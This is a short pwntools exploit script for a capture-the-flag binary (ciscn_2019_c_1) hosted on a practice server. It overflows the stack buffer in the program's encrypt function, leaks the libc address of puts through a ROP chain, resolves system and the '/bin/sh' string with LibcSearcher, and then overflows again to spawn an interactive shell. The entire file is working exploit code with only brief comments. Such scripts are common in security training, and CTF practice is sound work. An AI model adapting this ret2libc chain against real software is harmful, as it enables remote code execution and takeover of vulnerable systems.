#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',28480)
#p = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_en_2')
context.log_level='debug'


offset = 0x50
encrypt = elf.symbols['encrypt']
main = 0x400B28
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x0000000000400c83
ret = 0x00000000004006b9

###ret2libc###
p.sendline('1')#entry encrypt()
p.recvuntil('Input your Plaintext to be encrypted\n')
payload = 'A' * offset + 'deadbeef' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
puts = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))

libc = LibcSearcher('puts',puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')

###stackoverflow again###
p.sendline('1')#entry encrypt()
p.recvuntil('Input your Plaintext to be encrypted\n')
payload = 'A' * offset + 'deadbeef' + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system) + 'anything'
p.sendline(payload)
p.interactive()
